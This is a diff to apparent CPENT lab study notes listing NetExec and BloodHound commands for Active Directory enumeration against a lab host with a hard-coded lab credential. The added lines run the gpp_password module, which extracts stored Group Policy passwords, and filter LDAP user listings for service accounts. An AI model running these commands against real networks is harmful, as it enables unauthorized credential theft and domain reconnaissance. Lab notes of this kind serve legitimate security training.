@@ -6,10 +6,13 @@ If we got the user password from kerbrute we can perform multiple smb Enumeratio
 
 Users:  nxc smb 172.25.170.80 -u 'cpent' -p 'Pa$$w0rd123' --users
 
+passwords: nxc smb 172.25.170.80 -u 'cpent' -p 'Pa$$w0rd123' -M gpp_password
+
 Shares : nxc smb 172.25.170.80 -u 'cpent' -p 'Pa$$w0rd123' --shares
 
 Groups: nxc smb 172.25.170.80 -u 'cpent' -p 'Pa$$w0rd123' --groups
 
 Bloodhound : bloodhound-python -u 'cpent' -p 'Pa$$w0rd123' -d 'ECC.LOCALNET' -dc '2012-DC.ECC.LOCALNET' -gc '2012-DC.ECC.LOCALNET' -c All
 
+service-users : nxc ldap 172.25.170.80 -u 'cpent' -p 'Pa$$w0rd123' --users | grep -iE "svc|service"
 
